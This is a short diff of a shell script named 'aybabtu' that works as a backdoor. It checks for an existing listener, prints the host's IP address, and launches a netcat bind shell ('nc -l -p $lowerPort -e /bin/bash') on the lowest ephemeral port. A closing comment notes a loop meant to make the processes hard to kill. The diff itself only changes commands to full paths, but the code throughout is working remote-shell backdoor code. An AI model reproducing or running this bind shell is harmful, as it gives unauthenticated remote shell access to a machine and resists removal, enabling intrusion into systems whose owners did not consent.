@@ -4,10 +4,10 @@ if ps -ef | grep nc | grep "-e /bin/bash" ; then
 	exit 0
 else
 	echo "starting aybabtu"
-	ifconfig en1 | grep 'inet ' | cut -d' ' -f2
+	/sbin/ifconfig en1 | grep 'inet ' | cut -d' ' -f2
 	read lowerPort upperPort <<< $(/usr/sbin/sysctl net.inet.ip.portrange.first net.inet.ip.portrange.last | cut -d':' -f2 | cut -d' ' -f2)
 	echo $lowerPort
-	nc -l -p $lowerPort -e /bin/bash &
+	/usr/local/bin/nc -l -p $lowerPort -e /bin/bash &
 	exit 0
 fi
 #this loop is interesting. makes it hard to kill the processes
